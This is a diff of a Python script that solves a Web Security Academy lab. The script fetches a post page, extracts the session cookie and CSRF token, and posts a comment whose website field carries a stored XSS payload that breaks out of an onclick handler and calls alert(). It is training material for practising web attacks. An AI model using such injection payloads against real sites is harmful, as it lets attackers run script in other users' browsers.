@@ -1,16 +1,17 @@
-##################################################################################
+############################################################################################
 #
 # Author: Ahmed Elqalaawy (@elqal3awii)
 #
-# Date: 17/11/2023
+# Date: 24/11/2023
 #
-# Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded
+# Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded 
+#      and single quotes and backslash escaped
 #
 # Steps: 1. Fetch a post page
 #        2. Extract the session cookie and the csrf token to post a comment
 #        3. Post a comment with the injected payload in the website field
 #
-##################################################################################
+############################################################################################
 
 
 ###########
@@ -25,7 +26,7 @@ import re
 #########
 
 # change this to your lab URL
-url = "https://0ac3001304c6113a8244974500dd008a.web-security-academy.net"
+url = "https://0a3b006f03d2605380e15dca005900cd.web-security-academy.net"
 
 try:  
     # fetch a post page
@@ -46,14 +47,14 @@ csrf = re.findall("csrf.+value=\"(.+)\"", post_page.text)[0]
 print(Fore.WHITE + "⦗2⦘ Extracting the session cookie and the csrf token to post a comment.. " + Fore.GREEN + "OK")
 
 # payload to call the alert function
-payload = "javascript:alert(1)"
+payload = "http://lol.com&apos;);alert();//"
 
 # data to send via POST
 data = {
     "postId": "1",
     "name": "Hacker",
     "email": "hack@me.com",
-    "comment": "you are hacked",
+    "comment": "I hacked you",
     "website": payload,
     "csrf": csrf,
 }
